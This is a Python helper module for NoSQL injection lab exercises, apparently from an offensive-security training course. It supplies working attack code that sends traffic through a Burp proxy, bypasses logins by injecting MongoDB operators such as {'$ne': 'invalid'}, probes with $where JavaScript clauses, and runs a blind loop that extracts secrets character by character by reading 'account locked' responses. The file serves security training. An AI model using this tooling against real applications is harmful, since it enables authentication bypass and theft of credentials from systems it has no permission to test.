"""
utils.py — shared helpers for the NoSQL Injection module labs.

📝 Note: fully request-driven, `requests` with JSON bodies throughout —
MongoDB-style operator injection (this module's focus) is about swapping
plain string values for OPERATOR OBJECTS ({"$ne": "x"} instead of "x"), so
the exploitation surface is the request body's structure, not escaping
characters the way SQL injection is.
"""

import json
import string

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def login_attempt(session, url, username, password):
    """
    POST a login body. `password` can be a plain string (normal login) or
    a dict (a MongoDB operator object, e.g. {"$ne": "invalid"}) — requests'
    json= kwarg serializes either correctly.
    """
    body = {"username": username, "password": password}
    r = session.post(url, json=body)
    return r


def where_clause_probe(session, url, username, where_expr, password_filter=None):
    """
    Send a login request with an extra $where clause carrying a raw
    JavaScript expression — the classic NoSQL blind-injection oracle.
    `where_expr` should be a JS expression string that evaluates truthy/
    falsy; the response (locked vs invalid-credentials, usually) tells you
    which.
    """
    body = {
        "username": username,
        "password": password_filter or {"$ne": "invalid"},
        "$where": where_expr,
    }
    r = session.post(url, json=body)
    return r


CHARSET = string.ascii_lowercase + string.digits + "_"


def extract_via_where(session, url, username, js_condition_template, charset=None, max_len=40):
    """
    Generic blind-extraction loop: js_condition_template should be a format
    string with {value} for the candidate substring to test, returning a
    JS boolean expression. Builds up the target string one character (or
    one candidate match) at a time based on which probe gets a distinguishing
    response (checked via response text/status differences the lab exposes
    — e.g. 'Account locked' vs 'Invalid username or password').
    """
    charset = charset or CHARSET
    found = ""
    for position in range(max_len):
        found_char = None
        for c in charset:
            candidate = found + c
            where_expr = js_condition_template.format(value=candidate)
            r = where_clause_probe(session, url, username, where_expr)
            if "lock" in r.text.lower():  # distinguishing signal — adjust per lab
                found_char = c
                break
        if found_char is None:
            break
        found += found_char
        log(f"Progress: {found!r}")
    return found
